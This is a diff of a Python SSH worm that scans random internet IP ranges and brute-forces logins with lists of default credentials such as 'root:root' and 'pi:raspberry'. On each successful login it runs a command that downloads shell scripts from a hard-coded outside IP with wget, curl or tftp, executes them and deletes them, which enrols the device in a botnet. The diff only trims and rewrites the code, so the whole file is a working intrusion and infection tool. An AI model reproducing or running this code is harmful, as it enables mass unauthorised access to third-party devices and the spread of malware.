@@ -1,142 +1,31 @@
 #!/usr/bin/env python
-# -*- coding: utf-8 -*-
-#MUST INSTALL PARAMIKO
-#yum install python-paramiko -y
+import threading, paramiko, random, socket, time, sys
 
-import threading, paramiko, random, socket, time, sys, os
-usage='python b1naryv3.py [threads] [A|B|C|BRAZIL|SUPER|LUCKY|LUCKY2|RAND|INTERNET] [IPRANGE] [1|2|routers|perl|ubuntu|root|vps1|vps2|vps3|r00ted]'
-if len(sys.argv) < 4:
-        sys.exit(usage)
-os.system("echo -e 'ulimit -s 999999; ulimit -n 999999; ulimit -u 999999\n' > ~/.bashrc")
-os.system("ulimit -s 999999; ulimit -n 999999; ulimit -u 999999")
-paramiko.util.log_to_file("/dev/null")
-os.system("sysctl -w fs.file-max=999999 >/dev/null")
 
-"""
-████████▄     ▄████████    ▄████████  ▄█  ███▄▄▄▄      ▄████████    ▄████████ 
-███   ▀███   ███    ███   ███    ███ ███  ███▀▀▀██▄   ███    ███   ███    ███ 
-███    ███   ███    █▀    ███    █▀  ███▌ ███   ███   ███    █▀    ███    █▀  
-███    ███  ▄███▄▄▄      ▄███▄▄▄     ███▌ ███   ███  ▄███▄▄▄       ███        
-███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀     ███▌ ███   ███ ▀▀███▀▀▀     ▀███████████ 
-███    ███   ███    █▄    ███        ███  ███   ███   ███    █▄           ███ 
-███   ▄███   ███    ███   ███        ███  ███   ███   ███    ███    ▄█    ███ 
-████████▀    ██████████   ███        █▀    ▀█   █▀    ██████████  ▄████████▀                                                                           
-"""
-cmd='cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.161/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 46.166.185.161 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 46.166.185.161; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.161 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n' #PAYLOAD
 blacklist = [
     '127'
 ]
+
 passwords = [ 
-	"root:root",
-	"root:toor",
-	"root:admin",
-	"root:1234",
-	"root:maxided",
-	"root:pi",
-	"root:alpine",
-	"root:r00tnull3d",
-	"root:r00tnull3d#",
-	"root:rootnull3d#",
-	"root:password",
-	"root:centos6svm",
-	"root:1234",
-    "root:123456",
-    "root:Love2020",
-    "root:Zero",
-    "root:Password",
-    "root:password",
-    "root:qwerty",
-    "root:dragon",
-    "root:pussy",
-    "root:baseball",
-    "root:football",
-    "root:monkey",
-    "root:696969",
-    "root:abc123"
-	"admin:admin",
-	"admin:1234",
-	"admin:Guest",
-	"ubnt:ubnt",
-	"guest:guest",
-	"user:user",
-	"test:test",
-	"pi:raspberry",
-	"vagrant:vagrant",
-	"localhost:root",
-	"B1NARY:B1NARY",
-	"tim:tim",
-	"CISCO:CISCO",
-	"netgear"
-	"support:support",
-	"oracle:oracle",
-	"cusadmin:password",
+    "root:root",
+    "root:admin",
+    "admin:admin",
+    "ubnt:ubnt"
+    "root:1234",
+    "admin:1234",
+    "guest:guest",
+    "user:user",
+    "test:test",
+    "pi:raspberry",
+    "vagrant:vagrant"
 ]
-
-"""
- ▄█     ▄███████▄         ▄████████    ▄████████    ▄██████▄  ███▄▄▄▄      ▄████████    ▄████████ 
-███    ███    ███        ███    ███   ███    ███   ███    ███ ███▀▀▀██▄   ███    ███   ███    ███ 
-███▌   ███    ███        ███    ███   ███    ███   ███    █▀  ███   ███   ███    █▀    ███    █▀  
-███▌   ███    ███       ▄███▄▄▄▄██▀   ███    ███  ▄███        ███   ███  ▄███▄▄▄       ███        
-███▌ ▀█████████▀       ▀▀███▀▀▀▀▀   ▀███████████ ▀▀███ ████▄  ███   ███ ▀▀███▀▀▀     ▀███████████ 
-███    ███             ▀███████████   ███    ███   ███    ███ ███   ███   ███    █▄           ███ 
-███    ███               ███    ███   ███    ███   ███    ███ ███   ███   ███    ███    ▄█    ███ 
-█▀    ▄████▀             ███    ███   ███    █▀    ████████▀   ▀█   █▀    ██████████  ▄████████▀  
-                         ███    ███                                                               
-"""
-br = ["179.105","179.152","189.29","189.32","189.33","189.34","189.35","189.39","189.4","189.54","189.55","189.60","189.61","189.62","189.63","189.126"]
-yeet = ["122","131","161","37","186","187","31","188","201","2","200"]
-lucky = ["125.24","125.25","125.26","125.27","125.28","113.53","101.51","101.108","118.175","118.173","182.52","180.180"]
-lucky2 = ["119.91","119.92","119.93","113.53"]
-lol = ["1","2","5","119","180","113","125","122","46","101",""]
-load = ["125.25","125.26","125.27","119.92","119.93","180.180","113.53","185.52"]
-
-"""
-   ▄███████▄    ▄████████    ▄████████    ▄████████       ▄████████  ▄██████▄    ▄▄▄▄███▄▄▄▄   ▀█████████▄   ▄██████▄     ▄████████ 
-  ███    ███   ███    ███   ███    ███   ███    ███      ███    ███ ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ ███    ███   ███    ███ 
-  ███    ███   ███    ███   ███    █▀    ███    █▀       ███    █▀  ███    ███ ███   ███   ███   ███    ███ ███    ███   ███    █▀  
-  ███    ███   ███    ███   ███          ███             ███        ███    ███ ███   ███   ███  ▄███▄▄▄██▀  ███    ███   ███        
-▀█████████▀  ▀███████████ ▀███████████ ▀███████████      ███        ███    ███ ███   ███   ███ ▀▀███▀▀▀██▄  ███    ███ ▀███████████ 
-  ███          ███    ███          ███          ███      ███    █▄  ███    ███ ███   ███   ███   ███    ██▄ ███    ███          ███ 
-  ███          ███    ███    ▄█    ███    ▄█    ███      ███    ███ ███    ███ ███   ███   ███   ███    ███ ███    ███    ▄█    ███ 
- ▄████▀        ███    █▀   ▄████████▀   ▄████████▀       ████████▀   ▀██████▀   ▀█   ███   █▀  ▄█████████▀   ▀██████▀   ▄████████▀                                                                                                                                  
-"""
 
 if sys.argv[4] == '1':
     passwords = ["root:root", "root:admin", "admin:1234"]
-if sys.argv[4] == '2':
-	passwords = ["root:root", "root:toor", "root:admin", "admin:1234", "oracle:oracle", "root:alpine"]
-if sys.argv[4] == 'routers':
-	passwords = ["root:admin", "root:root", "admin:1234", "admin:password", "cisco:cisco", "netgear:netgear", "cusadmin:password"]
-if sys.argv[4] == 'perl':
-    passwords = [ "pi:raspberry", "vagrant:vagrant", "ubnt:ubnt" ]
-if sys.argv[4] == 'ubuntu':
-    passwords = [ "ubnt:ubnt", "ubnt:1234", "ubnt:password" ]
-if sys.argv[4] == 'root':
-    passwords = [ "root:root","root:test" ]
-if sys.argv[4] == 'vps1':
-	passwords = [ "root:maxided", "root:centos6svm", "root:123456", "root:Love2020", "root:Zero", "root:Password", "root:password"]
-if sys.argv[4] == 'vps2':
-	passwords = [ "root:maxided", "root:centos6svm", "root:1234", "root:qwerty", "root:dragon", "root:pussy", "root:baseball"]
-if sys.argv[4] == 'vps3':
-	passwords = [ "root:maxided", "root:centos6svm", "root:football", "root:monkey", "root:696969", "root:abc123"]
-if sys.argv[4] == 'r00ted':
-	passwords = [ "localhost:root", "B1NARY:B1NARY", "root:r00tnull3d#", "root:Flunzy2016", "bash:root"]
-if sys.argv[4] == 'brute':
-	passwords = [ "root:centos6svm", "root:root", "root:toor", "root:abc123", "root:maxided"]
-if sys.argv[4] == 'lol':
-	passwords = [ "admin:1234"]
 
-"""
- ▄█     ▄███████▄       ▄████████  ▄█          ▄████████    ▄████████    ▄████████    ▄████████    ▄████████ 
-███    ███    ███      ███    ███ ███         ███    ███   ███    ███   ███    ███   ███    ███   ███    ███ 
-███▌   ███    ███      ███    █▀  ███         ███    ███   ███    █▀    ███    █▀    ███    █▀    ███    █▀  
-███▌   ███    ███      ███        ███         ███    ███   ███          ███         ▄███▄▄▄       ███        
-███▌ ▀█████████▀       ███        ███       ▀███████████ ▀███████████ ▀███████████ ▀▀███▀▀▀     ▀███████████ 
-███    ███             ███    █▄  ███         ███    ███          ███          ███   ███    █▄           ███ 
-███    ███             ███    ███ ███▌    ▄   ███    ███    ▄█    ███    ▄█    ███   ███    ███    ▄█    ███ 
-█▀    ▄████▀           ████████▀  █████▄▄██   ███    █▀   ▄████████▀   ▄████████▀    ██████████  ▄████████▀  
-                                  ▀                                                                          
-"""
+jackmeoff = random.choice(["see nudes of rootgod"])
+raw_input('Press <ENTER> To '+jackmeoff)
+
 ipclassinfo = sys.argv[2]
 if ipclassinfo == "A":
     ip1 = sys.argv[3]
@@ -154,17 +43,6 @@ elif ipclassinfo == "C":
             ip2 = ip
         elif num == 3:
             ip3 = ip
-"""
-   ▄████████    ▄████████    ▄█    █▄            ▄████████  ▄████████    ▄████████ ███▄▄▄▄   ███▄▄▄▄      ▄████████    ▄████████ 
-  ███    ███   ███    ███   ███    ███          ███    ███ ███    ███   ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███   ███    ███ 
-  ███    █▀    ███    █▀    ███    ███          ███    █▀  ███    █▀    ███    ███ ███   ███ ███   ███   ███    █▀    ███    ███ 
-  ███          ███         ▄███▄▄▄▄███▄▄        ███        ███          ███    ███ ███   ███ ███   ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
-▀███████████ ▀███████████ ▀▀███▀▀▀▀███▀       ▀███████████ ███        ▀███████████ ███   ███ ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
-         ███          ███   ███    ███                 ███ ███    █▄    ███    ███ ███   ███ ███   ███   ███    █▄  ▀███████████ 
-   ▄█    ███    ▄█    ███   ███    ███           ▄█    ███ ███    ███   ███    ███ ███   ███ ███   ███   ███    ███   ███    ███ 
- ▄████████▀   ▄████████▀    ███    █▀          ▄████████▀  ████████▀    ███    █▀   ▀█   █▀   ▀█   █▀    ██████████   ███    ███ 
-                                                                                                                      ███    ███ 
-"""
 class sshscanner(threading.Thread):
     global passwords
     global ipclassinfo
@@ -189,19 +67,22 @@ class sshscanner(threading.Thread):
                     elif ipclassinfo == "C":
                         self.host = ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
                     elif ipclassinfo == "BRAZIL":
+                        br = ["179.105","179.152","189.29","189.32","189.33","189.34","189.35","189.39","189.4","189.54","189.55","189.60","189.61","189.62","189.63","189.126"]
                         self.host = random.choice(br)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                     elif ipclassinfo == "SUPER":
+                        yeet = ["122","131","161","37","186","187","31","188","201","2","200"]
                         self.host = random.choice(yeet)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                     elif ipclassinfo == "LUCKY":
+                        lucky = ["125.24","125.25","125.26","125.27","125.28","113.53","101.51","101.108","118.175","118.173","182.52","180.180"]
                         self.host = random.choice(lucky)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                     elif ipclassinfo == "LUCKY2":
+                        lucky2 = [ "122.178","122.170","182.65","182.68","182.70","182.75","186.112","186.113","186.114","186.115","186.116","186.118" ]
                         self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                     elif ipclassinfo == "RAND":
                         self.host = str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                     elif ipclassinfo == "INTERNET":
+                        lol = ["1"]
                         self.host = random.choice(lol)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
-                    elif ipclassinfo == "LOAD":
-                        self.host = random.choice(load)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                     else:
                         self.host = str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                     for badip in blacklist:
@@ -242,11 +123,10 @@ class sshscanner(threading.Thread):
                 if "inet addr" in output:
                     badserver=False
                 if badserver == False:
-						print 'Infecting: '+self.host+'on port '+str(port)+'Using '+username+':'+password
-                        ssh.exec_command(""+cmd+"")
+                        print 'Found '+self.host+'|'+username+'|'+password+'|'+str(port)
+                        ssh.exec_command(" cd /tmp; wget http://46.166.185.161/bins.sh || curl -O http://46.166.185.161/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 46.166.185.161 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 46.166.185.161; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh")
                         time.sleep(20)
                         ssh.close()
-                        open("infected.txt","a").write(username+":"+password+":"+self.host+"\n")
             except:
                 pass
 
